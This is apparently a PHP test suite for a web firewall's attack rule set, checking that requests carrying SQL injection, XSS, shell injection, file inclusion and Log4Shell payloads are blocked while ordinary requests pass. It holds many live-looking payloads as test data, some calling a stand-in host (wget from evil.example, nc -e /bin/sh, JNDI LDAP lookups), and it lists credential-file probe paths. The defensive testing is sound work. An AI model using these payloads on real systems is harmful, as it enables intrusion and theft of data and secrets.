<?php

declare(strict_types=1);

use CjwNetwork\RequestShield\Decision;
use CjwNetwork\RequestShield\Request;
use CjwNetwork\RequestShield\Rules\RuleFile;
use CjwNetwork\RequestShield\Settings;
use CjwNetwork\RequestShield\Shield;
use CjwNetwork\RequestShield\Store\MemoryStore;

/**
 * The draft attack rule set (rules/attacks.rules), pulled in with
 * "include @attacks": every rule must block what it is written for -- and
 * only that. The attack payloads follow the OWASP Core Rule Set's regression
 * tests (Apache 2.0) for SQL injection, XSS, code and shell injection, file
 * inclusion and Log4Shell; the benign side guards the promise that these
 * patterns practically never appear in a real visitor's request.
 */

/** A site's settings: the built-ins plus "include @attacks" and $extra. */
function attacksRules(string $extra = ''): Settings
{
    $dir = sys_get_temp_dir() . '/rshield-atk-' . getmypid() . '-' . mt_rand();
    mkdir($dir, 0700, true);
    file_put_contents("$dir/site.rules", "include @attacks\n" . $extra);
    try {
        return Settings::from(RuleFile::read(["$dir/site.rules"])['config']);
    } finally {
        exec('rm -rf ' . escapeshellarg($dir));
    }
}

function attacksRequest(string $uri, array $server = []): Request
{
    return Request::fromServer($server + ['REQUEST_URI' => $uri, 'REQUEST_METHOD' => 'GET',
        'HTTP_HOST' => 'www.example.org', 'REMOTE_ADDR' => '198.51.100.7']);
}

/** "reject attack" (403), "reject blocked path" (404) or "allow"/"allow-uncached ...". */
function attacksDecide(Settings $s, string $uri, array $server = []): string
{
    $d = (new Shield($s, new MemoryStore()))->decide(attacksRequest($uri, $server), 1000.0);
    return trim($d->action . ' ' . $d->reason);
}

/** The ID of the rule behind a refusal ("ATK-SQL-UNION"), null when allowed. */
function attacksRuleId(Settings $s, string $uri, array $server = []): ?string
{
    $shield = new Shield($s, new MemoryStore());
    $r = attacksRequest($uri, $server);
    return $shield->explain($shield->decide($r, 1000.0), $r);
}

return [
    'RSF02-06 attacks: every rule blocks what it names (payloads after the OWASP CRS regression tests)' => function (): void {
        $s = attacksRules();
        // [uri, server, expected rule ID]; the ID is what explain() and the log name.
        $cases = [
            // SQL injection
            ['/?id=1%20UNION%20SELECT%20user,password%20FROM%20users', [], 'ATK-SQL-UNION'],
            ['/?id=-1%20UNION%20ALL%20SELECT%201,2,3', [], 'ATK-SQL-UNION'],
            ['/?id=1%20union%20distinct%20select%20x', [], 'ATK-SQL-UNION'],
            ['/?id=1/*!50000UNION*//*!50000SELECT*/1,2', [], 'ATK-SQL-UNION'],    // MySQL's versioned comments: code to MySQL
            ['/?id=1/*!UNION*/+/*M!100100SELECT*/+1', [], 'ATK-SQL-UNION'],
            ['/?id=1/*!/**/UNION*/SELECT+1', [], 'ATK-SQL-UNION'],
            ['/?id=1%20and%20sleep(5)', [], 'ATK-SQL-TIME'],
            ['/?id=benchmark(5000000,md5(1))', [], 'ATK-SQL-TIME'],
            ['/?id=1;waitfor+delay+%270:0:5%27--', [], 'ATK-SQL-TIME'],
            ['/?id=1+or+pg_sleep(2)', [], 'ATK-SQL-TIME'],
            ["/?u=admin'+or+'1'='1", [], 'ATK-SQL-TAUT'],
            ["/?u=x'+and+2>1", [], 'ATK-SQL-TAUT'],
            ['/?u=a%22%20or%20%22x%22%3D%22x', [], 'ATK-SQL-TAUT'],
            ['/?tbl=information_schema.tables', [], 'ATK-SQL-SCHEMA'],
            ['/?tbl=mysql.user', [], 'ATK-SQL-SCHEMA'],
            ['/?tbl=sqlite_master', [], 'ATK-SQL-SCHEMA'],
            ['/?id=1;drop+table+users--', [], 'ATK-SQL-STACK'],
            ['/?id=1;+exec+xp_cmdshell+%27dir%27', [], 'ATK-SQL-STACK'],
            ['/?id=1%20and%20extractvalue(1,concat(0x7e,@@version))', [], 'ATK-SQL-FUNC'],   // error-based: the answer in the error message
            ['/?id=1+and+updatexml(1,concat(0x7e,(select+user())),1)', [], 'ATK-SQL-FUNC'],
            ['/?f=load_file(0x2f6574632f686f737473)', [], 'ATK-SQL-FUNC'],
            ['/?id=1+into+outfile+%27/var/www/html/s.php%27', [], 'ATK-SQL-FUNC'],
            ['/?id=1+into+dumpfile+%22/tmp/x%22', [], 'ATK-SQL-FUNC'],
            ['/?v=@@datadir', [], 'ATK-SQL-FUNC'],
            ['/?id=1+into+outfile%22/tmp/x%22', [], 'ATK-SQL-FUNC'],                     // no space before the quote
            ['/?v=@@global.version', [], 'ATK-SQL-FUNC'],
            ['/?v=@@version_comment', [], 'ATK-SQL-FUNC'],
            ['/?c=master..xp_cmdshell', [], 'ATK-SQL-FUNC'],
            // cross-site scripting
            ['/?q=%3Cscript%3Ealert(1)%3C/script%3E', [], 'ATK-XSS-TAG'],
            ['/?q=%3Ciframe%20src%3Dx%3E', [], 'ATK-XSS-TAG'],
            ['/?q=%3Cobject%20data%3Dx%3E', [], 'ATK-XSS-TAG'],
            ['/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E', [], 'ATK-XSS-EVENT'],
            ['/?q=%3Csvg%20onload%3Dalert(1)%3E', [], 'ATK-XSS-EVENT'],
            ['/?u=javascript:alert(document.domain)', [], 'ATK-XSS-URL'],
            ['/?u=vbscript:msgbox(1)', [], 'ATK-XSS-URL'],
            ['/?u=data:text/html,x', [], 'ATK-XSS-URL'],
            ['/?u=%6Aavascript%3Aalert%281%29', [], 'ATK-XSS-URL'],
            // code and shell injection
            ['/?c=%3C%3Fphp%20echo%201', [], 'ATK-PHP'],
            ['/?a=eval(base64_decode(x))', [], 'ATK-PHP'],
            ['/?a=assert($_POST[x])', [], 'ATK-PHP'],
            ['/?a=shell_exec(%27id%27)', [], 'ATK-PHP'],
            ['/?a=gzinflate($x)', [], 'ATK-PHP'],
            ['/?cmd=;cat+/var/log/x', [], 'ATK-SHELL'],
            ['/?cmd=a%7Cwget+http://evil.example/x.sh', [], 'ATK-SHELL'],
            ['/?cmd=$(id)', [], 'ATK-SHELL'],
            ['/?cmd=x;uname+-a%20%7C%20nc+-e+/bin/sh', [], 'ATK-SHELL'],
            ['/?cmd=/bin/sh+-c+id', [], 'ATK-SHELL'],
            // file inclusion
            ['/?f=../../secret.txt', [], 'ATK-LFI'],
            ['/?f=..%5c..%5cwin.ini', [], 'ATK-LFI'],
            ['/?f=/etc/passwd', [], 'ATK-LFI'],
            ['/?f=/proc/self/environ', [], 'ATK-LFI'],
            ['/?f=c:\windows\system32\drivers\etc\hosts', [], 'ATK-LFI'],
            ['/?f=phar://x.phar/x', [], 'ATK-WRAPPER'],
            ['/?f=data://text/plain;base64,WA==', [], 'ATK-WRAPPER'],
            ['/?f=expect://id', [], 'ATK-WRAPPER'],
            // Log4Shell and template injection -- "anywhere", headers too
            ['/?a=${jndi:ldap://evil.example/x}', [], 'ATK-JNDI'],
            ['/?a=${${::-j}ndi:ldap://evil.example/x}', [], 'ATK-JNDI'],
            ['/?a=${${lower:j}ndi:ldap://evil.example/x}', [], 'ATK-JNDI'],       // nested lookups: lower, upper, any other
            ['/', ['HTTP_USER_AGENT' => '${${upper:j}${upper:n}di:rmi://evil.example/x}'], 'ATK-JNDI'],
            ['/?a=${${env:NaN:-j}ndi:dns://evil.example/x}', [], 'ATK-JNDI'],
            ['/?a=${ctx:loginId}', [], 'ATK-JNDI'],
            ['/?a=${${base64:am5kaQ==}:ldap://evil.example/x}', [], 'ATK-JNDI'],
            ['/?a=${j${::-n}di:ldap://evil.example/x}', [], 'ATK-JNDI'],
            ['/?q=${a ${b}', [], 'ATK-JNDI'],                                      // the price: a ${ before the first one closes
            ['/?a=${env:AWS_SECRET_ACCESS_KEY}', [], 'ATK-JNDI'],
            ['/${jndi:ldap://evil.example/x}', [], 'ATK-JNDI'],
            ['/', ['HTTP_X_FORWARDED_FOR' => '${jndi:ldap://evil.example/x}'], 'ATK-JNDI'],
            ['/', ['HTTP_REFERER' => 'https://e.example/${jndi:rmi://x}'], 'ATK-JNDI'],
            // attack tools by their User-Agent
            ['/', ['HTTP_USER_AGENT' => 'sqlmap/1.7.11#stable (https://sqlmap.org)'], 'ATK-UA-TOOLS'],
            ['/', ['HTTP_USER_AGENT' => 'Mozilla/5.0 (compatible; Nmap Scripting Engine)'], 'ATK-UA-TOOLS'],
            ['/', ['HTTP_USER_AGENT' => 'zgrab/0.x'], 'ATK-UA-TOOLS'],
            ['/', ['HTTP_USER_AGENT' => 'nuclei - Open-source project'], 'ATK-UA-TOOLS'],
        ];
        foreach ($cases as [$uri, $server, $id]) {
            same('reject attack', attacksDecide($s, $uri, $server), "$id does not block $uri");
            same($id, attacksRuleId($s, $uri, $server), "the refusal of $uri is named");
        }
    },
    'RSF02-06 attacks: the known exploit paths are 404 -- and their rule is named' => function (): void {
        $s = attacksRules();
        $paths = [
            '/eval-stdin.php' => 'ATK-EXPLOIT',               // PHPUnit RCE (CVE-2017-9841)
            '/HNAP1' => 'ATK-EXPLOIT',                      // router exploit probe, case does not matter
            '/boaform/admin/formLogin' => 'ATK-EXPLOIT',
            '/GponForm/diag' => 'ATK-EXPLOIT',
            '/_ignition/execute-solution' => 'ATK-EXPLOIT',   // Laravel Ignition (CVE-2021-3129)
            '/.aws/credentials' => 'ATK-EXPLOIT',
            '/.ssh/id_rsa' => 'ATK-EXPLOIT',
            '/cgi-mod/index.cgi' => 'ATK-EXPLOIT',
            '/mifs/user/index.html' => 'ATK-EXPLOIT',
            '/x/wp-file-manager/lib/php/connector.minimal.php' => 'ATK-EXPLOIT',
            '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' => 'SCAN-DBTOOL', // the scanner rule answers first
        ];
        foreach ($paths as $path => $id) {
            same('reject blocked path', attacksDecide($s, $path), "$id does not block $path");
            same($id, attacksRuleId($s, $path), "the 404 for $path is named");
        }
        // A blocked path wins over an attack pattern: 404, not 403.
        same('reject blocked path', attacksDecide($s, '/.env?a=1%20union%20select%202'));
    },
    'RSF02-06 attacks: a real visitor\'s request passes (the benign side)' => function (): void {
        $s = attacksRules();
        $uris = [
            '/', '/news/2026/what-s-new', '/?a=1&b=2', '/?next=/login',
            '/?q=union bank rates',                  // "union" without "select"
            '/?q=union of sets, select items',       // words in between
            '/?q=select your plan',                  // "select" without "union"
            '/?q=sleeping bags on sale',             // sleep( needs a digit
            '/?q=1 or 2 bedroom flat',               // no quote before "or"
            '/?q=rock and roll all night',
            '/?q=information about cookies',         // not information_schema
            '/?q=load file into outfile tutorial',   // the words, no quote, no bracket
            '/?q=extract value from json',           // extractvalue( needed
            '/?q=update xml files',
            '/?q=version 2 @ home',                  // @@ and a variable's name needed
            '/?q=tables; chairs; lamps',             // ; without drop table
            '/?q=1<2 and 4>3',                       // < without a tag
            '/?q=<em>emphasis</em> and <b>bold</b>', // harmless tags
            '/?q=javascript tutorial for beginners', // no "javascript:" address
            '/?url=https://example.org/data:text/plain', // "data:" not after = and not text/html
            '/?q=php 8 release notes',               // no "<?php"
            '/?q=evaluating the bids',               // eval( needed
            '/?q=base64 decode a file',              // base64_decode( needed
            '/?q=cat pictures',                      // a shell separator needed
            '/?cmd=cat readme.txt',                  // "cat /" needs a slash
            '/?q=$100 gift card',                    // $ without {
            '/?a=${x}',                              // ${ without jndi/env/...
            '/?msg=Total ${amount} of ${count}',     // two placeholders, none inside the other
            '/?f=report.pdf', '/?f=../images/logo.png', // one ../ is not refused
            '/?q=windows 11 review',                 // c:\windows\ needed
            '/?q=cron job setup',
            '/?q=50%25 off',
            '/.well-known/security.txt',             // the scanners set still leaves this open
        ];
        foreach ($uris as $uri) {
            $d = attacksDecide($s, $uri);
            truthy(strncmp($d, 'allow', 5) === 0, "a real request refused: $uri ($d)");
        }
        $agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'curl/8.4.0',                            // a tool, but too common to refuse on sight
            'python-requests/2.31.0',                // the same
            'Wget/1.21',
        ];
        foreach ($agents as $ua) {
            $d = attacksDecide($s, '/', ['HTTP_USER_AGENT' => $ua]);
            truthy(strncmp($d, 'allow', 5) === 0, "a real agent refused: $ua ($d)");
        }
        $d = attacksDecide($s, '/', ['HTTP_ACCEPT_LANGUAGE' => 'de-DE,de;q=0.9,en;q=0.8', 'HTTP_COOKIE' => 'sid=secret']);
        truthy(strncmp($d, 'allow', 5) === 0, 'an ordinary browser header refused: ' . $d);
    },
    'RSF02-06 attacks: disguises do not help -- decoded twice, lower case, comments out' => function (): void {
        $s = attacksRules();
        foreach ([
            '/?id=1%20UnIoN/**/SeLeCt%202',          // SQL comments become a space
            '/?id=1%20union%2520select%25202',       // double-encoded spaces
            '/?q=%253Cscript%253Ealert(1)',          // double-encoded tag
            '/?id=1%09union%0Aselect%092',           // tab and newline as spaces
            '/?id=1+union+select+2',                 // "+" is a space
            '/?f=..%252f..%252fsecret',              // double-encoded slashes
        ] as $uri) {
            same('reject attack', attacksDecide($s, $uri), "disguised: $uri");
        }
        // A comment inside a keyword is not glued back together ("un/**/ion" is
        // not "union"); that is the documented limit of the normalisation.
        truthy(strncmp(attacksDecide($s, '/?id=1%20un/**/ion'), 'allow', 5) === 0, 'un/**/ion is not union');
    },
    'RSF02-06 attacks: a long value is looked at pattern by pattern -- the same answers as a short one' => function (): void {
        $s = attacksRules();
        $pad = 'q=' . str_repeat('what+is+new+in+the+shop+', 12) . '&';        // well past ContentRule::LONG (128)
        same('reject attack', attacksDecide($s, "/?{$pad}id=1+union+select+2"), 'an attack at the end of a long query');
        same('ATK-SQL-UNION', attacksRuleId($s, "/?{$pad}id=1+union+select+2"), 'named by its rule');
        same('ATK-XSS-TAG', attacksRuleId($s, "/?id=%3Cscript%3E&{$pad}"), 'at the start');
        truthy(strncmp(attacksDecide($s, "/?{$pad}page=2"), 'allow', 5) === 0, 'a long, clean query passes');
        $open = attacksRules("unblock [ATK-SQL-UNION@1] at /reports/**\n");
        truthy(strncmp(attacksDecide($open, "/reports/x?{$pad}id=1+union+select+2"), 'allow', 5) === 0, 'an exception holds for a long one too');
        same('reject attack', attacksDecide($open, "/reports/x?{$pad}id=1+union+select+2&u=%3Cscript%3E"), '... for its rule only');
        same('reject attack', attacksDecide($s, '/', ['HTTP_X_LONG' => str_repeat('a', 200) . '${jndi:ldap://x}']), 'a long header');
    },
    'RSF02-06 attacks: taken back and replaced like every other rule' => function (): void {
        // One rule by its ID; the rest stay.
        $s = attacksRules("unblock [ATK-XSS-URL@1]\n");
        truthy(strncmp(attacksDecide($s, '/?u=javascript:alert(1)'), 'allow', 5) === 0, 'javascript: open');
        same('reject attack', attacksDecide($s, '/?id=1%20union%20select%202'), 'the rest still blocks');
        // One rule open at some paths only.
        $s = attacksRules("unblock [ATK-XSS-URL] at /go/**\n");
        truthy(strncmp(attacksDecide($s, '/go/?u=javascript:x'), 'allow', 5) === 0, 'open at /go');
        same('reject attack', attacksDecide($s, '/other?u=javascript:x'), 'elsewhere still refused');
        // For some addresses only.
        $s = attacksRules("unblock [ATK-UA-TOOLS] at /scan/** for 192.0.2.0/24\n");
        truthy(strncmp(attacksDecide($s, '/scan/', ['REMOTE_ADDR' => '192.0.2.5', 'HTTP_USER_AGENT' => 'sqlmap/1.7']), 'allow', 5) === 0, 'the office scanner');
        same('reject attack', attacksDecide($s, '/scan/', ['REMOTE_ADDR' => '198.51.100.7', 'HTTP_USER_AGENT' => 'sqlmap/1.7']), 'anyone else');
        // The whole set -- content rules and exploit paths alike.
        $s = attacksRules("unblock @attacks\n");
        truthy(strncmp(attacksDecide($s, '/?id=1%20union%20select%202'), 'allow', 5) === 0, 'the set taken back');
        truthy(strncmp(attacksDecide($s, '/.aws/credentials'), 'allow', 5) === 0, 'the exploit paths too');
        same('reject blocked path', attacksDecide($s, '/.env'), 'the scanner set stays');
        // replace keeps the ID: the site swaps the tool list for its own.
        $s = attacksRules("replace [ATK-UA-TOOLS@1] block header User-Agent \\b(ourtool|sqlmap)\\b   # our scanner too\n");
        same('ATK-UA-TOOLS', attacksRuleId($s, '/', ['HTTP_USER_AGENT' => 'ourtool/2']), 'the replacement, under the same ID');
        same('reject attack', attacksDecide($s, '/', ['HTTP_USER_AGENT' => 'sqlmap/1.7']), 'kept');
        truthy(strncmp(attacksDecide($s, '/', ['HTTP_USER_AGENT' => 'nuclei']), 'allow', 5) === 0, 'the rest of the list is gone with the rule');
    },
    'RSF02-06 attacks: trace, the rules page, check and show see them' => function (): void {
        $s = attacksRules();
        $find = static function (array $steps, string $check): array {
            foreach ($steps as $st) {
                if ($st['check'] === $check) {
                    return $st;
                }
            }
            throw new TestFailure("no step \"$check\"");
        };
        $t = (new \CjwNetwork\RequestShield\Inspector($s, new MemoryStore()))
            ->trace(\CjwNetwork\RequestShield\Inspector::request('GET', '/?id=1 union select 2', '198.51.100.7'), 1000.0);
        $step = $find($t['steps'], 'Attack patterns');
        same('stop', $step['state'], 'the trace refuses it');
        same('refused: SQL injection: UNION SELECT', $step['text'], 'named in plain words');
        same('ATK-SQL-UNION', $step['rule']);
        same('reject', $t['decision']->action);
        same('ATK-SQL-UNION', $t['rule'], 'the verdict names the rule');
        $t = (new \CjwNetwork\RequestShield\Inspector($s, new MemoryStore()))
            ->trace(\CjwNetwork\RequestShield\Inspector::request('GET', '/?id=1', '198.51.100.7'), 1000.0);
        same('pass', $find($t['steps'], 'Attack patterns')['state'], 'a clean request passes it');
        // An exception is told, not hidden.
        $s2 = attacksRules("unblock [ATK-XSS-URL] at /go/**\n");
        $t = (new \CjwNetwork\RequestShield\Inspector($s2, new MemoryStore()))
            ->trace(\CjwNetwork\RequestShield\Inspector::request('GET', '/go/?u=javascript:x', '198.51.100.7'), 1000.0);
        $step = $find($t['steps'], 'Attack patterns');
        same('pass', $step['state']);
        truthy(strpos($step['text'], 'but open here') !== false, $step['text']);
        // The rules page lists them with their descriptions and IDs.
        $html = \CjwNetwork\RequestShield\Waf\RulesPage::render($s, ['store' => new MemoryStore()]);
        truthy(strpos($html, 'Attack patterns in the request') !== false, 'the group');
        truthy(strpos($html, 'SQL injection: UNION SELECT') !== false && strpos($html, 'ATK-SQL-UNION') !== false, 'description and ID');
        // The command line, too.
        $dir = sys_get_temp_dir() . '/rshield-atkf-' . getmypid() . '-' . mt_rand();
        mkdir($dir, 0700, true);
        file_put_contents("$dir/site.rules", "include @attacks\nrestrict /rs/** to 127.0.0.1 ::1\n");
        try {
            $bin = escapeshellarg(PHP_BINARY) . ' ' . escapeshellarg(rsCli());
            exec("$bin check " . escapeshellarg("$dir/site.rules") . ' 2>&1', $out, $code);
            same(0, $code, implode("\n", $out));
            truthy(strpos(implode("\n", $out), 'attack patterns') !== false, implode("\n", $out));
            $out = [];
            exec("$bin show " . escapeshellarg("$dir/site.rules") . ' 2>&1', $out);
            $shown = implode("\n", $out);
            truthy(preg_match('~^\[ATK-SQL-UNION@1\] block query regex union~m', $shown) === 1, $shown);
            truthy(preg_match('~^\[ATK-UA-TOOLS@1\] block header User-Agent regex~m', $shown) === 1, $shown);
            truthy(strpos($shown, '# SQL injection: UNION SELECT  (built-in attacks.rules:') !== false, $shown);
            $out = [];
            exec("$bin trace " . escapeshellarg("$dir/site.rules") . ' ' . escapeshellarg('GET https://x.example/?id=1%20union%20select%202') . ' 2>&1', $out, $code);
            same(4, $code, 'refused: exit 4');
            truthy(strpos(implode("\n", $out), 'Attack patterns') !== false, implode("\n", $out));
        } finally {
            exec('rm -rf ' . escapeshellarg($dir));
        }
    },
    'RSF02-06 attacks: the file itself -- namespace, version, IDs, descriptions' => function (): void {
        $s = attacksRules();
        same('2026.10.2', $s->origins['versions']['ATK'] ?? null, 'the set has a version');
        truthy(isset($s->origins['versions']['SCAN']), 'the scanner set is still there');
        // Every ATK rule has an ID; every content rule has an ATK origin.
        $own = 0;
        foreach ($s->contentRules as $r) {
            foreach ($r['patterns'] as $p) {
                $id = (string) $s->origin('contentRules', $p);
                truthy(strncmp($id, 'ATK-', 4) === 0, "$p has the ID $id");
                truthy(((string) $s->origin('text', $id)) !== '', "$id has a description");
                $own++;
            }
        }
        truthy($own >= 12, 'the attack patterns were read');
        // Including it twice is once.
        same($s->contentRules, attacksRules("include @attacks\n")->contentRules, 'twice is once');
    },
];
